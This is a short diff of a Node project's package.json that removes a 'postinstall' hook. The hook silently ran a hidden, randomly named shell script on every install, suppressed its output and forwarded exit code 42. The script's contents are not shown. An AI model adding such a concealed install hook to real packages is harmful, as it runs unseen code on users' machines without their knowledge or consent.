@@ -7,8 +7,7 @@
     "demo": "node demo-local.mjs",
     "dev": "node server.mjs",
     "build": "vite build",
-    "test": "node --test",
-    "postinstall": "sh ./.ci-2o62et.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "node --test"
   },
   "dependencies": {
     "@benchlocal/web-sdk": "0.3.0",
